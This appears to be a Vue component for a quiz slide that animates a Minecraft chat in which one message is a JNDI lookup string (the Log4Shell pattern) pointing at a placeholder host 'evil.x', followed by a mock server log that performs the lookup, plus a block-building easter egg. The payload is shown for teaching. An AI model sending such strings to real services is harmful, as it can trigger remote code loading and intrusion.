<script setup lang="ts">
// Q: Minecraft. A plain multiplayer chat where one message is a JNDI lookup string,
// and the server log under it obediently "looks it up". Lines appear one by one on slide enter.
// Egg: a player keeps building the secret letter out of blocks, one block at a time, right in chat.
import { computed, onUnmounted, ref, watch } from 'vue'
import { useReplay } from '../../composables/useReplay'

const active = useReplay()
const chat = [
  { who: 'player42', msg: 'hi all' },
  { who: 'kat_09', msg: 'trade?' },
  { who: 'x0r', msg: '${jndi:ldap://evil.x/a}', bad: true },
  { who: 'player42', msg: '??' },
]
const props = defineProps<{ egg?: string }>()  // secret round-3 letter, see quiz-slides skill
// 4×5 pixel glyphs; add one here if the letter changes
const glyphs: Record<string, string[]> = { E: ['####', '#...', '###.', '#...', '####'] }
const cells = computed(() => (glyphs[props.egg ?? ''] ?? []).flatMap(r => [...r].map(ch => ch === '#')))
// build order: only the filled cells, row by row
const order = computed(() => cells.value.map((f, i) => (f ? i : -1)).filter(i => i >= 0))
const placed = ref(0)
let t: ReturnType<typeof setInterval> | undefined
watch(active, (a) => {
  clearInterval(t)
  placed.value = 0
  if (!a || !props.egg) return
  let tick = -8 // wait for the chat lines first
  t = setInterval(() => {
    tick++
    if (tick > order.value.length + 14) tick = 0 // hold the finished letter, then rebuild
    placed.value = Math.max(0, Math.min(tick, order.value.length))
  }, 150)
}, { immediate: true })
onUnmounted(() => clearInterval(t))
const isPlaced = (i: number) => order.value.indexOf(i) > -1 && order.value.indexOf(i) < placed.value
</script>

<template>
  <div class="cl" :class="{ on: active }">
    <div class="win">
      <div class="bar dm-label">Chat</div>
      <div v-for="(c, i) in chat" :key="i" class="ln" :class="{ bad: c.bad }" :style="{ '--d': `${0.2 + i * 0.3}s` }">
        <span class="who">&lt;{{ c.who }}&gt;</span> {{ c.msg }}
      </div>
      <div v-if="egg" class="ln egg-ln" style="--d: 1.1s">
        <span class="who">&lt;mason&gt;</span> look:
        <span class="build"><i v-for="(f, i) in cells" :key="i" :class="{ b: f && isPlaced(i) }" /></span>
      </div>
    </div>
    <div class="log">
      <div class="dm-label dm-soft">Server log</div>
      <div class="ln" style="--d: 1.5s">[INFO] Looking up ldap://evil.x/a …</div>
    </div>
  </div>
</template>

<style scoped>
.cl { display: flex; flex-direction: column; gap: .5rem; }
.win { background: var(--dm-ink); color: var(--dm-white); border: 2.5px solid var(--dm-ink); padding: 0 .5rem .45rem; }
.bar { font-size: .55rem; color: var(--dm-paper-2); border-bottom: 2px solid var(--dm-ink-soft); margin: 0 -.5rem .35rem; padding: .25rem .5rem; }
.ln { font-family: var(--dm-mono); font-size: .6rem; line-height: 1.6; white-space: nowrap; opacity: 0; transition: opacity .25s steps(2) var(--d); }
.on .ln { opacity: 1; }
.who { color: var(--dm-paper-2); }
.ln.bad { color: var(--dm-white); background: var(--dm-red); margin: 0 -.5rem; padding: 0 .5rem; }
.ln.bad .who { color: var(--dm-white); }
.log { border-top: 2px solid var(--dm-ink); padding-top: .3rem; }
.log .dm-label { font-size: .55rem; }
.log .ln { color: var(--dm-ink); white-space: normal; }
.egg-ln { display: flex; align-items: center; gap: .4rem; padding-top: .3rem; padding-bottom: .15rem; }
.build { display: grid; grid-template-columns: repeat(4, .5rem); gap: 1px; }
.build i { width: .5rem; height: .5rem; box-sizing: border-box; }
.build i.b {
  background: var(--dm-red); border-right: .1rem solid var(--dm-red-deep); border-bottom: .1rem solid var(--dm-red-deep);
  animation: cl-place .18s steps(2);
}
@keyframes cl-place { from { transform: translateY(-.35rem); } to { transform: none; } }
</style>
